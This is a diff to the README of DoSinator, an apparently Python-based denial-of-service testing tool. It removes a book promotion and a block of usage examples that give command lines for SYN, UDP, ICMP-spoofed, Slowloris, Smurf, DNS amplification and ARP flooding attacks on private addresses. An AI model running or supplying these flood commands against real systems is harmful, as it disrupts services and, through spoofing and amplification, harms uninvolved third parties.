@@ -45,12 +45,6 @@ DoSinator is a powerful Denial of Service (DoS) testing tool developed in Python
    ```
 ---
 
-## 📖 BONUS: My Book
-
-I'm excited to share my book, **"Mastering Scapy: A Comprehensive Guide to Network Analysis."** You can explore it [here](https://denizhalil.com/2023/11/12/scapy-guide-to-network-analysis-book/).
-
----
-
 ## Usage
 
 ```shell
@@ -113,46 +107,8 @@ options:
 
 ## Usage Examples
 
-Here are some usage examples of DoSinator:
+Here are some usage examples of DoSinator: You can explore it [here](https://denizhalil.com/2023/11/27/dosinator-denial-of-service-tool/):
 
-#### SYN Flood Attack
-```shell
-python dosinator.py -t 192.168.1.1 -p 80 -ar 1000 -d 60 -am syn
-```
-
-#### UDP Flood Attack with Custom Data
-```shell
-python dosinator.py -t 192.168.1.2 -p 53 -ar 500 -d 120 -am udp --data "CustomPayload123"
-```
-
-#### ICMP Flood Attack with IP Spoofing
-```shell
-python dosinator.py -t 192.168.1.3 -p 443 -ar 200 -d 180 -am icmp -sp random
-```
-
-#### HTTP Slowloris Attack
-```shell
-python dosinator.py -t 192.168.1.4 -p 8080 -ar 50 -d 300 -am slowloris
-```
-
-#### Smurf Attack
-```shell
-python dosinator.py -t 192.168.1.5 -p 0 -ar 100 -d 240 -am smurf
-```
-
-#### DNS Amplification Attack with Data from File
-```shell
-python dosinator.py -t 192.168.1.6 -p 53 -ar 300 -d 150 -am dns --file dns_query.txt
-```
-#### ARP Request Flooding Attack
-```shell
-python3 dosinator.py -t 192.168.1.7 -am arp --arp-mode request
-```
-
-#### ARP Reply Flooding Attack
-```shell
-python3 dosinator.py -t 192.168.1.8 -am arp --arp-mode reply
-```
 
 Please use this tool responsibly and ensure you have the necessary permissions before conducting any tests.
 
